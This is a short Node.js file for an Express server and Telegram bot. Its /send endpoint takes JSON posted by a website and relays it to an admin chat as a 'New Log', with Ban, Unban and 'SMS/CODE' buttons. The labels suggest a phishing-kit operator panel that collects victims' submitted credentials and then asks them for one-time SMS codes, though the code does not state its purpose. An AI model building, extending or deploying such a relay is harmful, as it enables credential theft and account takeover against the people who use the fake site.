const express = require("express");
const TelegramBot = require("node-telegram-bot-api");

const app = express();
app.use(express.json());

const token = process.env.BOT_TOKEN;
const adminId = process.env.ADMIN_CHAT_ID;

const bot = new TelegramBot(token, { polling: true });

console.log("STARTED");

// обычные сообщения
bot.on("message", (msg) => {
  if (msg.text === "/id") {
    bot.sendMessage(msg.chat.id, "Твой ID: " + msg.chat.id);
  } else if (msg.text === "/test") {
    const requestId = Date.now();

    bot.sendMessage(adminId, "🆕 Тест заявка ID: " + requestId, {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "🚫 Бан", callback_data: "ban_" + requestId },
            { text: "✅ Разбан", callback_data: "unban_" + requestId }
          ],
          [
            { text: "➡️ SMS/CODE", callback_data: "allow_" + requestId }
          ]
        ]
      }
    });
  }
});

// кнопки
bot.on("callback_query", (q) => {
  console.log("CLICK:", q.data);

  let text = "";

  if (q.data.startsWith("ban")) text = "🚫 пользователь забанен";
  if (q.data.startsWith("unban")) text = "✅ пользователь разбанен";
  if (q.data.startsWith("allow")) text = "➡️ SMS/CODE";

  bot.answerCallbackQuery(q.id, { text });
});

// API от сайта
app.post("/send", (req, res) => {
  const data = req.body;
  const requestId = Date.now();

  bot.sendMessage(
    adminId,
    "👻 Новый Лог 🔥ID: " + requestId + "\n\n" + JSON.stringify(data, null, 2),
    {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "🚫 Бан", callback_data: "ban_" + requestId },
            { text: "✅ Разбан", callback_data: "unban_" + requestId }
          ],
          [
            { text: "➡️ SMS/CODE", callback_data: "allow_" + requestId }
          ]
        ]
      }
    }
  );

  res.json({ ok: true });
});

// проверка сервера
app.get("/", (req, res) => {
  res.send("ok");
});

app.listen(process.env.PORT || 3000, () => {
  console.log("SERVER WORKING");
});
